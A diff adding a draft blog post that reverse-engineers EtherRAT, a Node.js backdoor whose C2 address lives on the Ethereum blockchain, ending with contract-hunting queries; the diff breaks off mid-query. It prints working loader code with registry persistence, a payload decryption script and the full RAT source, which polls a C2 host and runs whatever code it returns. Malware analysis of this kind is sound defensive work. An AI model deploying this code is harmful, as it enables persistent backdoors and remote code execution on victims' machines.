@@ -1,8 +1,947 @@
 ---
 title: "A case of etherRat"
 date: 2026-04-20
-tags: ["malware", "forensics", "investigation"]
-description: ""
+tags: ["malware", "forensics", "investigation", "blockchain"]
+description: "Digging into EtherRAT, a Node.js backdoor found in the wild that stores its C2 address on the Ethereum blockchain."
 draft: true
 ---
 
+I recently came across an EtherRAT execution launched via a malicious clone of PsExec, a legitimate administration tool by Sysinternals installed by an admin on a workstation.
+
+I hadn't heard of EtherRAT before this, so I looked it up and found an article by [Atos](https://atos.net/en/lp/cybershield/etherrat-distribution-spoofing-administrative-tools-via-github-facades) explaining in detail how it works.
+
+Here are the main takeaways:
+
+- Distribution is done via SEO poisoning of a GitHub repository cloning the legitimate tool.
+- The first repo contains nothing but a README file redirecting to a second repo that hosts the actual malware. This two-step redirect is designed to evade bot detection for optimal SEO, since cloaking is not possible on GitHub pages.
+- The C2 address is not hardcoded but stored inside a smart contract on the Ethereum blockchain, which makes it difficult to blocklist.
+
+In this article I want to dig deeper, reverse the malware step by step, and also look at the smart contract to understand how it works and whether detection patterns can be derived from it.
+
+So let's dig in!
+
+---
+
+## Initial Access
+
+When searching for "PsExec download" the second result is a GitHub repository impersonating the legitimate tool.
+
+![Google search results showing the poisoned GitHub repo ranking second](/blog/etherrat/seo-search.png)
+
+The repo contains only a README with a link redirecting to a second GitHub account (note the different username).
+
+![First repo README with redirect link to a different GitHub account](/blog/etherrat/first-repo.png)
+
+This two-repo structure is intentional, it keeps the landing page clean enough to rank in search results while keeping the actual payload one click away and less exposed to automated scanners.
+
+The second repo presents a release containing a ZIP file. The source code is empty (worth checking).
+
+![Second repo showing the release with a ZIP file and empty source code](/blog/etherrat/second-repo.png)
+
+Inside the ZIP is an MSI setup file, alongside a `data/` folder containing 22 binary `.data` files, each paired with a `.data:Zone.Identifier` file. These Zone.Identifier files are NTFS Alternate Data Streams, a Windows mechanism that automatically tags files downloaded from the internet with their origin (mark of the web). The `.data` files themselves are encrypted or encoded binary blobs whose exact purpose we'll try to determine in the next sections.
+
+![ZIP contents showing the MSI and data folder with binary files](/blog/etherrat/zip-contents.png)
+
+---
+
+## Unpacking the MSI
+
+This MSI is the initial access vector for the malware. To inspect its contents, we can extract it using `lessmsi`:
+
+```powershell
+.\lessmsi.exe x C:\Temp\PsExec.msi C:\Temp\extracted\
+```
+
+![lessmsi extraction output showing the files](/blog/etherrat/lessmsi-1.png)
+
+![Extracted files view](/blog/etherrat/lessmsi-2.png)
+
+We can see three interesting files: `G57C58cDjhNDZfT.bin`, `jkOCdaFelt.xml`, and `OkJZg8fh.cmd`.
+
+---
+
+## Stage 1: The .cmd Loader
+
+`OkJZg8fh.cmd` contains obfuscated commands using variable splitting, substring slicing, and similar techniques. A simple way to deobfuscate them is to print the variables to get an idea of what's happening (or just paste it to an LLM, that also works).
+
+I couldn't find the exact obfuscator they used, they probably combined multiple techniques.
+
+This simple script prints all the variables and at the end we'll have a pretty readable script: [deobf-vars.ps1](https://github.com/aircag/aircag.xyz/blob/main/tools/deobf-vars.ps1)
+
+![deobf-vars.ps1 output showing the resolved variables and deobfuscated script](/blog/etherrat/deobf-output.png)
+
+As we can see, it checks for the presence of Node.js, if it's missing it installs it, and then executes the XML file as a JavaScript file.
+
+So let's see what's in the JS file.
+
+---
+
+## Stage 2: The XOR-Encoded JavaScript
+
+The JavaScript file uses XOR encoding to hide all its strings. Every string is stored as a list of numbers and decoded on the fly when the script runs.
+
+Once we decrypt the file we get this cleaner code:
+
+<details>
+<summary>jkOCdaFelt.xml, decrypted</summary>
+
+```js
+// === SETUP ===
+var f  = require("fs")
+var p  = require("path")
+var sp = require("child_process").spawn
+var d  = p.dirname(process.argv[1])         // script's own folder
+var x  = process.execPath                   // path to node.exe
+
+var k  = Buffer.from("ee62cc0e09d5b...", "hex")   // decryption key
+var n  = Buffer.from("9d9fcb115ce9...", "hex")    // nonce
+var si = Buffer.from("a8788f5103b6...", "hex")    // substitution table (S-box)
+var ef = p.join(d, "G57C58cDjhNDZfT.bin")         // payload file
+
+// === DECRYPTION ===
+function dc() {
+  var data = f.readFileSync(ef)
+  var out  = Buffer.alloc(data.length)
+  var prev = n[0]
+  for (var i = 0; i < data.length; i++) {
+    var b = data[i]
+    var tmp = b
+    b = (b - prev) & 0xff                        // step 1: delta decode
+    b = b ^ n[i % n.length] ^ ((i >> 8) & 0xff) // step 2: XOR
+    b = si[b]                                    // step 3: S-box lookup
+    b = (b - k[i % k.length]) & 0xff            // step 4: key subtraction
+    out[i] = b
+    prev = tmp
+  }
+  return out
+}
+
+// === EXECUTION LOOP ===
+function go() {
+  try {
+    var payload = dc()
+    var child = sp(x, ["-"], {
+      stdio: ["pipe", "ignore", "ignore"],
+      windowsHide: true                     // no visible window
+    })
+    child.stdin.write(payload)              // inject decrypted payload via stdin
+    child.stdin.end()
+    child.on("exit", function() {
+      setTimeout(go, 5000)                  // if process dies -> restart after 5s
+    })
+  } catch(e) {
+    setTimeout(go, 10000)                   // on error -> retry after 10s
+  }
+}
+
+// === PERSISTENCE (Run key) ===
+require("child_process").execFileSync(
+  "reg",
+  [
+    "add",
+    "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+    "/v", "AppResolver",
+    "/d", "conhost --headless \"" + x + "\" \"" + p.join(d, "jkOCdaFelt.xml") + "\"",
+    "/f"
+  ],
+  { windowsHide: true, stdio: "ignore" }
+)
+
+go()
+```
+
+</details>
+
+**`dc()`** decrypts the payload in memory using 4 chained steps:
+1. **Delta decode**: each byte is subtracted from the previous one
+2. **XOR**: against a 16-byte nonce `9d9fcb115ce9f687...` + current index
+3. **S-box substitution**: 256-byte lookup table remaps each byte
+4. **Key subtraction**: subtracts a 64-byte key `ee62cc0e09d5b6...`
+
+**`go()`** spawns a new hidden Node.js process and feeds the decrypted payload directly through stdin.
+
+**Persistence** is achieved via `reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"`.
+
+---
+
+## Decrypting the Payload
+
+Now that we have everything, we can write a script to decrypt `G57C58cDjhNDZfT.bin` and see what it does:
+
+<details>
+<summary>decrypt_payload.js</summary>
+
+```js
+var f  = require("fs")
+var p  = require("path")
+
+var k  = Buffer.from("ee62cc0e09d5b6b79d3b0460ffd4d34cec5a7cf0c07c31e613d853ca72fb24e666238a009ab8155126b9ec6f342b36e0092fd7b09a2a903b5552de662169e61d", "hex")
+var n  = Buffer.from("9d9fcb115ce9f6870555f9cfe4c44ca8", "hex")
+var si = Buffer.from("a8788f5103b6beaddc6696ed29d1a5b0ffde10f61f728b8c4f7aa60f93b9340212d758890dc6ecc71ce2144d0e5f3b593df0d431eb210875301e3c39c5b765884a3a9f7947bc61da4b49fe4225fc854e40819c13700526e4b80bb3a9aa9235572cf49862d31a2d46373fcbac6b915a8eaf00e71624f209741517c9c4117f5bf123017c9006ba220754ca50dfdb4c978a6fd0860cdd0ae6c3a1435669faf5f3ef7dee6d68f9b47bea41d5715cab832b95fb5e32e0288de3046ed2bb9a331dcca7602fbda49b481b995d762e6cc26327948719c8aed8a3f86752c1fd55e17e823e1853bfa220e9442ab19d73cd45e5d677b26a9ed9ce3836a0f7cfb5e88464c080", "hex")
+
+var data = f.readFileSync("G57C58cDjhNDZfT.bin")
+var out  = Buffer.alloc(data.length)
+var prev = n[0]
+
+for (var i = 0; i < data.length; i++) {
+  var b = data[i], tmp = b
+  b = (b - prev) & 0xff
+  b = b ^ n[i % n.length] ^ ((i >> 8) & 0xff)
+  b = si[b]
+  b = (b - k[i % k.length]) & 0xff
+  out[i] = b
+  prev = tmp
+}
+
+f.writeFileSync("payload_decrypted.bin", out)
+console.log("Done, check payload_decrypted.bin")
+```
+
+</details>
+
+Right after this we get another JS file.
+
+![Decrypted payload JS file](/blog/etherrat/payload-js.png)
+
+This time it doesn't look obfuscated or encrypted.
+
+---
+
+## Stage 3: The RAT Payload
+
+<details>
+<summary>G57C58cDjhNDZfT.bin, decrypted</summary>
+
+```js
+(() => {
+  var _a = {
+      0x149(module) {
+        function _b(_c) {
+          var _d = new Error("Cannot\x20find\x20module\x20\x27" + _c + "\x27");
+          _d["code"] = "MODULE_NOT_FOUND";
+          throw _d;
+        }
+        (_b["keys"] = () => []),
+          (_b["resolve"] = _b),
+          (_b["id"] = 0x149),
+          (module["exports"] = _b);
+      },
+      0x2ed(module) {
+        "use strict";
+        module["exports"] = require("crypto");
+      },
+      0x17f(module) {
+        "use strict";
+        module["exports"] = require("fs");
+      },
+      0x16e(module) {
+        "use strict";
+        module["exports"] = require("os");
+      },
+      0x3(module) {
+        "use strict";
+        module["exports"] = require("path");
+      },
+    },
+    _e = {};
+
+  function _f(_g) {
+    var _h = _e[_g];
+    if (_h !== undefined) return _h["exports"];
+    var module = (_e[_g] = { exports: {} });
+    return _a[_g](module, module["exports"], _f), module["exports"];
+  }
+  (() => {
+    _f["o"] = (_i, _j) => Object["prototype"]["hasOwnProperty"]["call"](_i, _j);
+  })();
+  var _k = {};
+
+  (async () => {
+    // hardcoded config: fallback C2 URL, build ID, contract addresses, RPC endpoints
+    const _l = "http://localhost:3000",
+      _m = "4a52cfa8-0901-4642-9925-8af08496c7b9",
+      _n = "0x54c3a36d66deb7f6b55ba2de1769e8da6fac6ccc",
+      _o = "0xf2d18dac0b1fac217c221c598ab01b1b9ae621ca",
+      _p = !![],
+      _q = !![],
+      _r = ["https://1rpc.io/eth"],
+      _s = _f(0x17f),
+      _t = _f(0x3),
+      _u = _f(0x2ed);
+    let _v = _l,
+      _w = _q;
+
+    // generate obfuscated install directory path using COMPUTERNAME+USERNAME hash
+    const _x = () => {
+        const _y =
+            process["env"]["LOCALAPPDATA"] ||
+            _t["join"](process["env"]["USERPROFILE"] || "", "AppData", "Local"),
+          _z = ["Microsoft", "Windows", "Programs", "Packages", "Google"],
+          _aa = ["Services", "Components", "Assemblies", "Extensions", "Modules"],
+          _ab =
+            (process["env"]["COMPUTERNAME"] || "") +
+            (process["env"]["USERNAME"] || ""),
+          _ac = _u["createHash"]("md5")
+            ["update"](_ab)
+            ["digest"]("hex")
+            ["slice"](0x0, 0x8),
+          _ad = _z[parseInt(_ac["slice"](0x0, 0x2), 0x10) % _z["length"]],
+          _ae = _aa[parseInt(_ac["slice"](0x2, 0x4), 0x10) % _aa["length"]],
+          _af = _ac["slice"](0x4),
+          _ag = _t["join"](_y, _ad);
+        if (_s["existsSync"](_ag)) return _t["join"](_ag, _ae, _af);
+        return _t["join"](_y, _ac);
+      },
+      _ah = _x(),
+      _ai = _t["join"](
+        _ah,
+        _u["createHash"]("md5")["update"](_ah)["digest"]("hex")["slice"](0x0, 0x6)
+      ),
+      _aj = _t["join"](process["env"]["APPDATA"], "svchost.log"),
+
+      log = (_ak) => {
+        if (!_w) return;
+        try {
+          const _al = new Date()["toISOString"]();
+          _s["appendFileSync"](_aj, "[" + _al + "]\x20" + _ak + "\x0a");
+        } catch (_am) {
+          try {
+            _s["writeFileSync"](_aj, "[" + ts + "]\x20LOG\x20ERROR:\x20" + _am["message"] + "\x0a");
+          } catch {}
+        }
+      },
+
+      _an = (_ao, _ap) => {
+        try {
+          const _aq = new Date()["toISOString"](),
+            _ar = _ap && _ap["stack"] ? _ap["stack"] : String(_ap);
+          _s["appendFileSync"](_aj, "[" + _aq + "]\x20" + _ao + ":\x20" + _ar + "\x0a");
+        } catch {}
+      };
+
+    process["on"]("unhandledRejection", (_as) => { _an("unhandledRejection", _as); }),
+    process["on"]("uncaughtException",  (_at) => { _an("uncaughtException",  _at); });
+
+    const _au = () => {
+        try {
+          if (_s["existsSync"](_ai)) {
+            const _av = _s["readFileSync"](_ai, "utf8");
+            return JSON["parse"](Buffer["from"](_av, "base64")["toString"]());
+          }
+        } catch {}
+        return null;
+      },
+
+      _aw = (_ax) => {
+        try {
+          _s["mkdirSync"](_ah, { recursive: !![] }),
+          _s["writeFileSync"](_ai, Buffer["from"](JSON["stringify"](_ax))["toString"]("base64")),
+          log("Config\x20saved");
+        } catch {}
+      },
+
+      _ay = () => {
+        let _az = _au();
+        if (_az && _az[0x0]) return _az[0x0];
+        const _ba = process["env"]["APPDATA"] || _f(0x16e)["homedir"](),
+          _bb = _t["join"](_ba, ".node_bot_id");
+        try {
+          if (_s["existsSync"](_bb)) {
+            const _bc = _s["readFileSync"](_bb, "utf8")["trim"]();
+            if (!_az) _az = {};
+            return (_az[0x0] = _bc), _aw(_az), _bc;
+          }
+        } catch {}
+        try {
+          const _bd = _s["readdirSync"](_ba)["filter"](
+            (_be) => _be["startsWith"](".") && _be["length"] === 0xb
+          );
+          if (_bd["length"] > 0x0) {
+            const _bf = _s["readFileSync"](_t["join"](_ba, _bd[0x0]), "utf8")["trim"]();
+            if (!_az) _az = {};
+            return (_az[0x0] = _bf), _aw(_az), _bf;
+          }
+        } catch {}
+        const _bg = _u["randomUUID"]();
+        if (!_az) _az = {};
+        return (_az[0x0] = _bg), _aw(_az), _bg;
+      },
+      _bh = _ay(),
+      _bi = (_bj) => new Promise((_bk) => setTimeout(_bk, _bj)),
+      _bl = "0x7d434425";
+
+    log("Started\x20|\x20ID:\x20" + _bh + "\x20|\x20Build:\x20" + _m),
+    log("Install\x20dir:\x20" + _ah);
+
+    // ABI-encode a call to the blockchain contract to retrieve the C2 URL
+    const _bm = (_bn) => {
+        return _bl + _bn["toLowerCase"]()["replace"]("0x", "")["padStart"](0x40, "0");
+      },
+
+      _bo = (_bp) => {
+        if (!_bp || _bp === "0x" || _bp["length"] < 0x82) return null;
+        try {
+          const _bq = _bp["replace"]("0x", ""),
+            _br = parseInt(_bq["slice"](0x0, 0x40), 0x10) * 0x2,
+            _bs = parseInt(_bq["slice"](_br, _br + 0x40), 0x10),
+            _bt = _bq["slice"](_br + 0x40, _br + 0x40 + _bs * 0x2);
+          return Buffer["from"](_bt, "hex")["toString"]("utf8");
+        } catch { return null; }
+      },
+
+      // query Ethereum RPC nodes to resolve C2 URL from on-chain contract
+      _bu = async () => {
+        const _bv = {},
+          _bw = _bm(_o),
+          _bx = _r["map"](async (_by) => {
+            try {
+              const _bz = await fetch(_by, {
+                  method: "POST",
+                  headers: { "Content-Type": "application/json" },
+                  body: JSON["stringify"]({
+                    jsonrpc: "2.0",
+                    method: "eth_call",
+                    params: [{ to: _n, data: _bw }, "latest"],
+                    id: 0x1,
+                  }),
+                  signal: AbortSignal["timeout"](0x2710),
+                }),
+                _ca = await _bz["json"]();
+              if (_ca["result"]) {
+                const _cb = _bo(_ca["result"]);
+                _cb && /^(https?|wss?):\/\//["test"](_cb) && (_bv[_by] = _cb["trim"]());
+              }
+            } catch {}
+          });
+        await Promise["allSettled"](_bx);
+        const _cc = Object["values"](_bv);
+        if (!_cc["length"]) return null;
+        const _cd = {};
+        return (
+          _cc["forEach"]((_ce) => { _cd[_ce] = (_cd[_ce] || 0x0) + 0x1; }),
+          Object["entries"](_cd)["sort"]((_cf, _cg) => _cg[0x1] - _cf[0x1])[0x0][0x0]
+        );
+      },
+
+      _ch = async () => {
+        if (!_p) { log("Blockchain\x20disabled,\x20using\x20fallback"); return; }
+        log("Fetching\x20URL\x20from\x20blockchain...");
+        const _ci = await _bu();
+        if (_ci) (_v = _ci), log("Blockchain\x20URL:\x20" + _ci);
+        else log("Blockchain\x20fetch\x20failed,\x20using\x20fallback");
+      };
+    await _ch(), log("Server\x20URL:\x20" + _v);
+
+    // self re-obfuscation: send own source to C2 and overwrite self with new version
+    const _cj = async () => {
+      try {
+        let _ck = _au();
+        if (!_ck || _ck[0x3]) { log("Reobfuscation\x20skipped\x20(already\x20done)"); return; }
+        if (!_ck[0x1]) return;
+        const _cl = _t["join"](_ah, _ck[0x1]);
+        if (!_s["existsSync"](_cl)) return;
+        log("Requesting\x20reobfuscation...");
+        const _cm = _s["readFileSync"](_cl, "utf8"),
+          _cn = await fetch(_v + "/api/[REOBF_PATH]/" + _bh, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON["stringify"]({ code: _cm, build: _m }),
+            signal: AbortSignal["timeout"](0x7530),
+          });
+        if (!_cn["ok"]) { log("Reobf\x20failed:\x20" + _cn["status"]); return; }
+        const _co = await _cn["text"]();
+        if (!_co || _co["length"] < 0x64) return;
+        _s["writeFileSync"](_cl, _co, "utf8"),
+        (_ck[0x3] = Date["now"]()),
+        _aw(_ck),
+        log("Reobfuscated,\x20saved\x20for\x20next\x20start");
+      } catch (_cp) { log("Reobf\x20error:\x20" + _cp["message"]); }
+    };
+    await _cj();
+
+    // poll C2 for tasks: disguise requests as static asset fetches (png/jpg/css/etc.)
+    async function _cq() {
+      const _cr = _u["randomBytes"](0x4)["toString"]("hex"),
+        _cs = ["png", "jpg", "gif", "css", "ico", "webp"],
+        _ct = _cs[Math["floor"](Math["random"]() * _cs["length"])],
+        _cu = ["id", "token", "key", "b", "q", "s", "v"],
+        _cv = _cu[Math["floor"](Math["random"]() * _cu["length"])],
+        _cw = _u["randomBytes"](0x4)["toString"]("hex"),
+        _cx = _v + "/api/" + _cr + "/" + _bh + "/" + _cw + "." + _ct + "?" + _cv + "=" + _m;
+      try {
+        log("Polling:\x20" + _cx);
+        const _cy = new AbortController(),
+          _cz = setTimeout(() => _cy["abort"](), 0x1d4c0),
+          _da = await fetch(_cx, { signal: _cy["signal"], headers: { "X-Bot-Server": _v } });
+        clearTimeout(_cz);
+        if (!_da["ok"]) { log("Poll\x20failed:\x20" + _da["status"]), await _bi(0x1388); return; }
+        const _db = await _da["text"]();
+        _db && _db["length"] > 0xa &&
+          (log("Received\x20task\x20(" + _db["length"] + "\x20bytes)"),
+          setImmediate(async () => {
+            try {
+              const _dc = Object["getPrototypeOf"](async function () {})["constructor"],
+                _dd = new _dc("require","process","Buffer","console","__dirname","__filename","log", _db);
+              await _dd(
+                typeof require !== "undefined" ? require : _f(0x149),
+                process, Buffer, console, __dirname, __filename, log
+              ),
+              log("Task\x20executed");
+            } catch (_de) { log("Task\x20error:\x20" + _de["message"]); }
+          }));
+      } catch (_df) {
+        _df["name"] !== "AbortError" &&
+          (log("Connect\x20error:\x20" + _df["message"]), await _bi(0x1388));
+      }
+    }
+
+    let _dg = Date["now"]();
+    setInterval(() => {
+      _p && Date["now"]() - _dg > 0x493e0 &&
+        (log("Refreshing\x20blockchain\x20URL..."),
+        _bu()["then"]((_dh) => { _dh && _dh !== _v && ((_v = _dh), log("New\x20URL:\x20" + _dh)); })["catch"](() => {}),
+        (_dg = Date["now"]()));
+      const _di = _au();
+      if (_di && typeof _di[0x5] === "boolean") _w = _di[0x5];
+    }, 0xea60),
+    log("Main\x20loop\x20started");
+
+    while (!![]) {
+      try { await _cq(); }
+      catch (_dj) { log("Loop\x20error:\x20" + _dj["message"]); }
+      await _bi(0x1f4);
+    }
+  })(),
+  (module["exports"] = _k);
+})();
+```
+
+</details>
+
+Here are the main points:
+
+1. **Victim fingerprinting**: generates a unique victim ID and a hidden install directory that looks like a legit Windows folder (e.g., `%LOCALAPPDATA%\Microsoft\Services\<hash>`)
+2. **Blockchain C2 resolution**: queries an Ethereum smart contract to get the C2 URL
+3. **Self re-obfuscation**: after the first run, the RAT sends its own source code to the C2, which returns a freshly obfuscated version to replace it
+4. **Beaconing**: polls every 500ms disguised as fake image/CSS requests (`.png`, `.jpg`, `.gif`, etc.). If the response contains a task (>10 bytes) it executes it immediately using `AsyncFunction` constructor, basically `eval()`
+5. **Full RCE**: executes any JavaScript the C2 sends back with full Node.js privileges
+6. **Blockchain refresh**: refreshes the C2 URL from the blockchain every 5 minutes in case it changes
+
+Logs are written to `%APPDATA%\svchost.log`.
+
+---
+
+## The Smart Contract
+
+Contract: `0x54c3a36D66DEB7F6b55ba2dE1769E8da6fAC6CCC`
+
+We can see a few transactions on [Etherscan](https://etherscan.io/address/0x54c3a36d66deb7f6b55ba2de1769e8da6fac6ccc).
+
+![Etherscan showing contract transactions](/blog/etherrat/etherscan.png)
+
+In the transactions we can see the C2 is now pointing to `hxxps://mode[.]com`.
+
+![Transaction data showing the C2 URL update](/blog/etherrat/c2-url-tx.png)
+
+At the time of this investigation, mode.com doesn't look compromised, I'm getting a 404 when hitting `https://mode.com/api/test123/test456/test.png?id=test` to imitate the malware.
+
+![404 response when mimicking the malware polling request](/blog/etherrat/mode-404.png)
+
+Here is how the code looks using the [heimdall](https://github.com/Jon-Becker/heimdall-rs) decompiler. We can see two main functions: `Unresolved_7d434425` and `Unresolved_7fcaf666`, a getter and a setter. Nothing fancy.
+
+<details>
+<summary>Decompiled contract (heimdall-rs)</summary>
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity >=0.8.0;
+
+/// @title            Decompiled Contract
+/// @author           Jonathan Becker <jonathan@jbecker.dev>
+/// @custom:version   heimdall-rs v0.9.2
+
+contract DecompiledContract {
+    uint256 public constant unresolved_11c39ac7 = 11276214;
+    uint256 public constant unresolved_7e9931e3 = 16357424;
+    uint256 public constant unresolved_d143237a = 14031400;
+    uint256 public constant unresolved_01aa410f = 9435650;
+
+    mapping(bytes32 => bytes32) storage_map_a;
+
+    event Event_5d5fc237();
+
+    /// @custom:selector    0x7fcaf666
+    /// @custom:signature   Unresolved_7fcaf666(uint256 arg0) public payable
+    function Unresolved_7fcaf666(uint256 arg0) public payable {
+        require(!arg0 > 0xffffffffffffffff);
+        require(!(arg0) > 0xffffffffffffffff);
+        uint256 var_c = var_c + (uint248(0x3f + (arg0 + 0x1f)));
+        require(!var_c.length > 0xffffffffffffffff);
+        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
+        require(bytes1(storage_map_a[var_a]));
+        var_a = keccak256(var_a);
+        storage_map_a[var_a] = (var_c.length << 0x01) + 0x01;
+        emit Event_5d5fc237(address(msg.sender), 0x20, var_c.length);
+    }
+
+    /// @custom:selector    0x7d434425
+    /// @custom:signature   Unresolved_7d434425(address arg0) public view returns (bytes memory)
+    function Unresolved_7d434425(address arg0) public view returns (bytes memory) {
+        require(arg0 == (address(arg0)));
+        address var_a = address(arg0);
+        require(bytes1(storage_map_a[var_a]));
+        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
+        address var_d = var_d + (0x20 + (((0x1f + (storage_map_a[var_a] >> 0x01)) / 0x20) * 0x20));
+        var_a = keccak256(var_a);
+        return abi.encodePacked(0x20, var_d.length);
+    }
+}
+```
+
+</details>
+
+Which effectively boils down to:
+
+```solidity
+function setURL(string calldata newURL) public {
+    // only contract owner can call this
+    storage[key] = newURL;
+    emit Event_5d5fc237(msg.sender, ...);
+}
+
+function getURL(address caller) public view returns (bytes memory) {
+    return storage_map_a[caller]; // returns the C2 URL
+}
+```
+
+---
+
+## Hunting at Scale with BigQuery
+
+The two function selectors `7d434425` (getter) and `7fcaf666` (setter) are essentially a fingerprint, the first 4 bytes of the keccak256 hash of each function's signature. Every EtherRAT C2 contract shares these selectors regardless of deployment address.
+
+Using Google BigQuery on the `bigquery-public-data.crypto_ethereum.contracts` dataset, we can search for contracts containing both selectors in their bytecode:
+
+```sql
+SELECT address, bytecode
+FROM `bigquery-public-data.crypto_ethereum.contracts`
+WHERE LOWER(bytecode) LIKE '%7d434425%'
+AND LOWER(bytecode) LIKE '%7fcaf666%'
+```
+
+This gave me 74 contracts.
+
+<details>
+<summary>All 74 EtherRAT C2 contracts</summary>
+
+```json
+[
+  { "address": "0x1cfb457d41b9e5eb6737fde2b590d1f78924aaa8" },
+  { "address": "0x242dd78e5966a0b8efa523b046c2248cefc570c7" },
+  { "address": "0x22f96d61cf118efabc7c5bf3384734fad2f6ead4" },
+  { "address": "0xe5104e46d351983e0648f3af7f736d639b94f82f" },
+  { "address": "0xa5b51ef13d070026da68618774054eaa1e49aa30" },
+  { "address": "0x61a817da8c6b0b3b2d2d6d0a99d2168311349576" },
+  { "address": "0xb6d42653b4a4e662cfeb911b237136ab9f32e8af" },
+  { "address": "0x7c9bd21169af2cb33ec012f3aba7f164647e5c5c" },
+  { "address": "0xe80e385cd9bfefe241adc3b474f8899e7c32b111" },
+  { "address": "0x376ae40709c35f47ee7fa22f310d1368faa7d21b" },
+  { "address": "0x213e5c7056654080c084f3f84ee6f774a3cf3ceb" },
+  { "address": "0xa1b40044ebc2794f207d45143bd82a1b86156c6b" },
+  { "address": "0x8b12e09abb2e5130310b24c75b51c8afd85e8223" },
+  { "address": "0xf1f3ac96e49f6a71d031444e59268c27b3511914" },
+  { "address": "0x47a397d9d459b05433f0d579e7842442b348ec38" },
+  { "address": "0xd33a3cf8b2396fb1ae30fa190ecd4fda6d5250cd" },
+  { "address": "0x8a7c8497991dea66910e70979a5961aee347ff50" },
+  { "address": "0x97851ae6b1e2970c030dd7d8f70d9832acfb30fd" },
+  { "address": "0x9268cc33d59415b033dc5d709ce30bbe09708fe3" },
+  { "address": "0xd043847a8ae6a496502ec44766e487df5938125a" },
+  { "address": "0x013da39114721b057aca0efb161294e46272f06d" },
+  { "address": "0x3780b6c970dac940d0cb3e0ce2b8745cf00ba3cf" },
+  { "address": "0x797ba45edd46ccdee29e24ace36f4f2185960b42" },
+  { "address": "0x2dbbf0a1f5f8468e1ade5608c979d9433503d866" },
+  { "address": "0x34d144f279881dd9c2c90bde5ff66d0d7fa16e64" },
+  { "address": "0xc323c7fff95e04ae3bcfee6a168128d41abc44b1" },
+  { "address": "0x123f12517f1643f0a8897776989f8d440aa76764" },
+  { "address": "0x73142bc5777209c180b314aaa3a5769b2ca3654f" },
+  { "address": "0x6ef160dac69c68461879c0c3486164af07533d17" },
+  { "address": "0x21f9a727e9668a3fc30393a344d8a3a98f4f3b8d" },
+  { "address": "0xd88125d10860e9887b0fd8b727ac842bceaf6040" },
+  { "address": "0xe26c57b7fa8de030238b0a71b3d063397ac127d3" },
+  { "address": "0xa721af945d20c92486ff4714e1418eed178dbbc6" },
+  { "address": "0x1efaba2816a7e9c8ff617c0fd7d236ba067274c4" },
+  { "address": "0x3f35e6fbe1098f0685137ab81189e891939825af" },
+  { "address": "0x2b77671cfee4907776a95abbb9681eee598c102e" },
+  { "address": "0x535419201734ef3a28084fbcf8c29fc9d5b0ce1b" },
+  { "address": "0x429929d8fe40d2decf618c4a87721ac2a820ba78" },
+  { "address": "0xe3eda8b518f5d9bc89153f0d29c5ad84c218d8b1" },
+  { "address": "0x006d681b4dd70f3b2277b283cf19713ff7bfc85a" },
+  { "address": "0x86044d5846bacc1027e8e2ab821b59fa313b7172" },
+  { "address": "0x40a7d723f5df6c88464bc95dbf7d96573fbc4f85" },
+  { "address": "0x195ab0a6391e2c499321f67ba36ed8f4bdc9f5f4" },
+  { "address": "0x1a3f8e013c392d8cf6ca5049ee7f437b383f27e1" },
+  { "address": "0xae35eb8fa62b2ccbb88a495ec7fd1e2f2b4a170e" },
+  { "address": "0x41133de675ff81b19c8569ecf25cdec3d7bb2a32" },
+  { "address": "0x54c3a36d66deb7f6b55ba2de1769e8da6fac6ccc" },
+  { "address": "0x45729d7424d7310a0c041a2906ba95a4bd5ebfca" },
+  { "address": "0xbc7931cd921d1878435397fb49c71f8e21d33a5f" },
+  { "address": "0x3e1ad4da997f4a94e5e01f7bb96dafa39c01e120" },
+  { "address": "0x10a60ebd558e9547c10a261c47b7589606b1bdbb" },
+  { "address": "0x3fc9edd5f720f5b439ef2d2fcce394b595c17a2a" },
+  { "address": "0xc7a92c95e3aadd4f8434bf094af7368aaa882396" },
+  { "address": "0xc12c8d8f9706244eca0acf04e880f10ff4e52522" },
+  { "address": "0xb3f2897f2bc797e5b9033faef8c81e92b01cb831" },
+  { "address": "0x8ce057065b265cb9aee75648e5df2341e97d2461" },
+  { "address": "0x2d5b08278ac82ad2f36c027155211faf508082d0" },
+  { "address": "0x64a2937d60a7242ccf88137c7692ff6414e85f21" },
+  { "address": "0x372c072b6c4aad569a17160d0fea071d1477ba73" },
+  { "address": "0x56c8f2ae7b3243bc8720c67142b6b5a9fe4e28b3" },
+  { "address": "0xeca4f6cef352169b963f133bbe49a37ac060580d" },
+  { "address": "0xb6083fa2323a15358037b64325a7ead4f92fa081" },
+  { "address": "0xd45ddb9959e58cf37a500b584b06fb4d0c09857e" },
+  { "address": "0xc7e2039334a27b1a53263f70ca982804e5c22683" },
+  { "address": "0x8b08ce78a284f26eedfe2b9b52823f8c6ab3dc4a" },
+  { "address": "0xd367602125ff7f987cec146e441faa5883acc9c3" },
+  { "address": "0xdf0b529043ef7a2bb9111bad26de624a326bacf9" },
+  { "address": "0x3a7fb4b83a3af76b41119d5aa75761e5530c2b26" },
+  { "address": "0x03db8e03239fa4829358e8fd5e7d588974dd11dc" },
+  { "address": "0x079ebb02986ebbe4a07d3134690fe5a5105c8675" },
+  { "address": "0xd3307711604d8e419d12fe265149704f8d1efc35" },
+  { "address": "0x9097a0afa46fb0b2d2f4f6d8ce51d8e4a3cf04e8" },
+  { "address": "0xe0988592530e1c8c75f6df38cca4f73c2fc1bc61" },
+  { "address": "0x1308d2c9f6c541284d639b533c82f135ed8c36ba" }
+]
+```
+
+</details>
+
+We can then go further and query each contract for its currently stored URL to identify which C2 servers are still active and map the domains used across all campaigns.
+
+<details>
+<summary>Full BigQuery, all transactions + decoded C2 URLs</summary>
+
+```sql
+-- Step 1: Get all EtherRAT C2 contracts (both selectors present)
+WITH etherrat_contracts AS (
+  SELECT address
+  FROM `bigquery-public-data.crypto_ethereum.contracts`
+  WHERE LOWER(bytecode) LIKE '%7d434425%'
+    AND LOWER(bytecode) LIKE '%7fcaf666%'
+    -- Filter out ERC20 false positives
+    AND LOWER(bytecode) NOT LIKE '%a9059cbb%'  -- transfer(address,uint256)
+    AND LOWER(bytecode) NOT LIKE '%095ea7b3%'  -- approve(address,uint256)
+    AND LOWER(bytecode) NOT LIKE '%23b872dd%'  -- transferFrom
+),
+
+-- Step 2: Get ALL transactions to these contracts
